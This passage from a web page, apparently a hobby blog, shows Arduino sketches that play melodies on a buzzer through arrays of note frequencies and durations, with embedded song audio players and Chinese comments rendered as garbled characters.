class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D1 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D2 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D3 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D4 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D5 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D6 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D7 556</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL1 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL2 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL3 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL4 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL5 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL6 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL7 278</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH1 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH2 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH3 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH4 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH5 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH6 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH7 112</span></span><br><span class="line"><span class="comment">//ä»¥ä¸Šéƒ¨åˆ†æ˜¯å®šä¹‰æ˜¯æŠŠæ¯ä¸ªéŸ³ç¬¦å’Œé¢‘ç‡å€¼å¯¹åº”èµ·æ¥ï¼Œå…¶å®ä¸ç”¨æ‰“è¿™ä¹ˆå¤šï¼Œä½†æ˜¯éƒ½æ‰“ä¸Šäº†ï¼Œåé¢å¯ä»¥éšæ„ç¼–å†™Dè°ƒçš„å„ç§æ­Œï¼Œæˆ‘è¿™é‡Œç”¨NOTE_D+æ•°å­—è¡¨ç¤ºéŸ³ç¬¦ï¼ŒNOTE_DH+æ•°å­—è¡¨ç¤ºä¸Šé¢æœ‰ç‚¹çš„é‚£ç§éŸ³ç¬¦ï¼ŒNOTE_DL+æ•°å­—è¡¨ç¤ºä¸‹é¢æœ‰ç‚¹çš„é‚£ç§éŸ³ç¬¦ã€‚è¿™æ ·åé¢å†™èµ·æ¥æ¯”è¾ƒå¥½è¯†åˆ«ã€‚</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">//è¿™éƒ¨åˆ†æ˜¯ç”¨è‹±æ–‡å¯¹åº”äº†æ‹å­ï¼Œè¿™æ ·åé¢ä¹Ÿæ¯”è¾ƒå¥½çœ‹</span></span><br><span class="line"><span class="keyword">int</span> tune[] =</span><br><span class="line">&#123;</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,</span><br><span class="line">  </span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,</span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D7,NOTE_D7,NOTE_D5,NOTE_D3,</span><br><span class="line">  NOTE_D5,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D3,NOTE_D3,NOTE_D1,NOTE_DL6,</span><br><span class="line">  NOTE_D1,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D7,NOTE_D5,</span><br><span class="line">  NOTE_D6,</span><br><span class="line">&#125;;<span class="comment">//è¿™éƒ¨åˆ†å°±æ˜¯æ•´é¦–æ›²å­çš„éŸ³ç¬¦éƒ¨åˆ†ï¼Œç”¨äº†ä¸€ä¸ªåºåˆ—å®šä¹‰ä¸ºtuneï¼Œæ•´æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> duration[]=</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  </span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">&#125;;<span class="comment">//è¿™éƒ¨åˆ†æ˜¯æ•´é¦–æ›²å­çš„æ¥æ‹éƒ¨åˆ†ï¼Œä¹Ÿå®šä¹‰ä¸ªåºåˆ—durationï¼Œæµ®ç‚¹ï¼ˆæ•°ç»„çš„ä¸ªæ•°å’Œå‰é¢éŸ³ç¬¦çš„ä¸ªæ•°æ˜¯ä¸€æ ·çš„ï¼Œä¸€ä¸€å¯¹åº”ä¹ˆï¼‰</span></span><br><span class="line"><span class="keyword">int</span> length;<span class="comment">//è¿™é‡Œå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåé¢ç”¨æ¥è¡¨ç¤ºå…±æœ‰å¤šå°‘ä¸ªéŸ³ç¬¦</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>;<span class="comment">//èœ‚é¸£å™¨çš„pin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);<span class="comment">//è®¾ç½®èœ‚é¸£å™¨çš„pinä¸ºè¾“å‡ºæ¨¡å¼</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);<span class="comment">//è¿™é‡Œç”¨äº†ä¸€ä¸ªsizeofå‡½æ•°ï¼Œå¯ä»¥æŸ¥å‡ºtoneåºåˆ—é‡Œæœ‰å¤šå°‘ä¸ªéŸ³ç¬¦</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)<span class="comment">//å¾ªç¯éŸ³ç¬¦çš„æ¬¡æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);<span class="comment">//æ­¤å‡½æ•°ä¾æ¬¡æ’­æ”¾tuneåºåˆ—é‡Œçš„æ•°ç»„ï¼Œå³æ¯ä¸ªéŸ³ç¬¦</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">400</span>*duration[x]);<span class="comment">//æ¯ä¸ªéŸ³ç¬¦æŒç»­çš„æ—¶é—´ï¼Œå³èŠ‚æ‹durationï¼Œ400æ˜¯è°ƒæ•´æ—¶é—´çš„è¶Šå¤§ï¼Œæ›²å­é€Ÿåº¦è¶Šæ…¢ï¼Œè¶Šå°æ›²å­é€Ÿåº¦è¶Šå¿«ï¼Œè‡ªå·±æŒæ¡å§</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);<span class="comment">//åœæ­¢å½“å‰éŸ³ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€éŸ³ç¬¦</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//ç­‰å¾…5ç§’åï¼Œå¾ªç¯é‡æ–°å¼€å§‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E5%8D%83%E6%9C%AC%E6%A8%B1.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A1 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A2 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3 556</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A4 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A5 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A6 742</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL1 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL2 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL3 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL4 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL5 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL6 371</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL7 416</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH1 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH2 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH3 1112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH4 1178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH5 1322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH6 1484</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH7 1665</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********** è¿™éƒ¨åˆ†æ˜¯ç”¨è‹±æ–‡å¯¹åº”äº†æ‹å­ **********/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™éƒ¨åˆ†å°±æ˜¯æ•´é¦–æ›²å­çš„éŸ³ç¬¦éƒ¨åˆ†,ç”¨äº†ä¸€ä¸ªåºåˆ—å®šä¹‰ä¸ºtuneï¼Œæ•´æ•° */</span></span><br><span class="line"><span class="keyword">int</span> tune[] = &#123;</span><br><span class="line">  A0,A0,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH3,AH1,AH2,A6,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A5,A1,A2,</span><br><span class="line">  A3,AH1,A6,AH3,</span><br><span class="line">  AH2,AH3,AH2,AH1,AH2,A6,A0,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,AH4,AH4,AH3,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  AH6,A5,A5,A6,A6</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™éƒ¨åˆ†æ˜¯æ•´é¦–æ›²å­çš„æ¥æ‹éƒ¨åˆ†ï¼Œä¹Ÿå®šä¹‰ä¸ªåºåˆ—durationï¼Œæµ®ç‚¹ï¼ˆæ•°ç»„çš„ä¸ªæ•°å’Œå‰é¢éŸ³ç¬¦çš„ä¸ªæ•°æ˜¯ä¸€æ ·çš„ï¼‰ */</span></span><br><span class="line"><span class="keyword">float</span> duration[]= &#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**********************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;     <span class="comment">/* è¿™é‡Œå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåé¢ç”¨æ¥è¡¨ç¤ºå…±æœ‰å¤šå°‘ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>; <span class="comment">/* èœ‚é¸£å™¨çš„pin */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* è®¾ç½®èœ‚é¸£å™¨çš„pinä¸ºè¾“å‡ºæ¨¡å¼ */</span></span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="comment">/* è¿™é‡Œç”¨äº†ä¸€ä¸ªsizeofå‡½æ•°ï¼Œå¯ä»¥æŸ¥å‡ºtoneåºåˆ—é‡Œæœ‰å¤šå°‘ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* å¾ªç¯éŸ³ç¬¦çš„æ¬¡æ•° */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)&#123;</span><br><span class="line">    <span class="comment">/* æ­¤å‡½æ•°ä¾æ¬¡æ’­æ”¾tuneåºåˆ—é‡Œçš„æ•°ç»„ï¼Œå³æ¯ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);</span><br><span class="line">    <span class="comment">/* æ¯ä¸ªéŸ³ç¬¦æŒç»­çš„æ—¶é—´ï¼Œå³èŠ‚æ‹durationï¼Œ450æ˜¯è°ƒæ•´æ—¶é—´çš„è¶Šå¤§ï¼Œæ›²å­é€Ÿåº¦è¶Šæ…¢ */</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">450</span>*duration[x]);</span><br><span class="line">    <span class="comment">/* åœæ­¢å½“å‰éŸ³ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€éŸ³ç¬¦ */</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* ç­‰å¾…5ç§’ï¼Œé‡æ–°å¼€å§‹å¾ªç¯ */</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E7%88%B1%E6%8B%BC%E6%89%8D%E4%BC%9A%E8%B5%A2.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 